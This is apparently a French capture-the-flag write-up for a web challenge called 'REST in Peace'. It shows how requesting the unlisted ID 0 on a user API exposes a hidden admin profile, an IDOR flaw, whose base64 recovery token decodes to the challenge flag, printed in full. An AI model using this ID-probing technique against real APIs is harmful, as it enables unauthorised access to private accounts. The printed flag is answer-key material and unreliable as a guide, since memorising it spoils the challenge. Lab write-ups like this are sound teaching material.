# Level 1 (IDOR) - REST in Peace

**Flag :** `HSR{ce_qu1_app4rti3nt_aux_autr3s_est_parf0is_fac1le_a_prendr3!}`

---

## Table des matières

- [Contexte](#contexte)
- [Étape 1 - Lister les utilisateurs](#étape-1---lister-les-utilisateurs)
- [Étape 2 - Tester l'ID 0](#étape-2---tester-lid-0)
- [Étape 3 - Décoder le flag](#étape-3---décoder-le-flag)
- [Résumé de la chaîne de résolution](#résumé-de-la-chaîne-de-résolution)

---

## Contexte

On accède à une interface web d'annuaire utilisateurs. L'API expose une liste publique et un endpoint de recherche par ID.

---

## Étape 1 - Lister les utilisateurs

On commence par charger la liste des utilisateurs via le bouton **"Charger"** ou directement :

```
GET /api/users
```

Réponse :

```json
{
  "count": 5,
  "users": [
    { "id": 1, "username": "xx_DarkHacker_xx", "plan": "free", "bio": "..." },
    { "id": 2, "username": "localhost", "plan": "pro", "bio": "..." },
    { "id": 3, "username": "git-push--force", "plan": "free", "bio": "..." },
    { "id": 4, "username": "sudo_rm_rf", "plan": "pro", "bio": "..." },
    { "id": 5, "username": "il_deploie_le_vendredi", "plan": "enterprise", "bio": "..." }
  ]
}
```

Observation : les identifiants vont de **1 à 5**. Il n'y a pas d'ID `0`.

---

## Étape 2 - Tester l'ID 0

L'endpoint `/api/users/:id` permet de consulter le détail d'un utilisateur. On teste l'ID `0` :

```
GET /api/users/0
```

Réponse :

```json
{
  "id": 0,
  "username": "superadmin",
  "email": "root@restinpeace.internal",
  "role": "admin",
  "plan": "internal",
  "recovery_token": "SFNSe2NlX3F1MV9hcHA0cnRpM250X2F1eF9hdXRyM3NfZXN0X3BhcmYwaXNfZmFjMWxlX2FfcHJlbmRyMyF9",
  "notes": "Compte réservé à l'administration interne. Ne pas exposer."
}
```

Un compte **administrateur caché** existe avec l'ID `0`. Il est filtré de la liste publique (`/api/users` exclut les `role: "admin"`), mais l'endpoint de détail **ne reproduit pas ce filtrage** - c'est une faille **IDOR** (Insecure Direct Object Reference).

Le champ `recovery_token` contient une valeur qui ressemble à du **base64** (caractères alphanumériques, longueur compatible, pas de caractères spéciaux). Le nom du champ ne dit pas "flag" - il faut comprendre que ce token de récupération cache en réalité le flag encodé.

---

## Étape 3 - Décoder le flag

On décode la valeur base64 :

```bash
echo "SFNSe2NlX3F1MV9hcHA0cnRpM250X2F1eF9hdXRyM3NfZXN0X3BhcmYwaXNfZmFjMWxlX2FfcHJlbmRyMyF9" | base64 -d
```

Résultat :

```
HSR{ce_qu1_app4rti3nt_aux_autr3s_est_parf0is_fac1le_a_prendr3!}
```

On peut aussi utiliser CyberChef, Python (`base64.b64decode()`), ou la console du navigateur (`atob()`).

---

## Résumé de la chaîne de résolution

```
Interface web (annuaire)
  |
  |-- GET /api/users -> liste publique (IDs 1-5, pas de 0)
          |
          |-- GET /api/users/0 -> profil admin complet (IDOR)
                    |
                    |-- champ "recovery_token" -> valeur encodée en base64
                              |
                              |-- décodage base64 -> flag
```
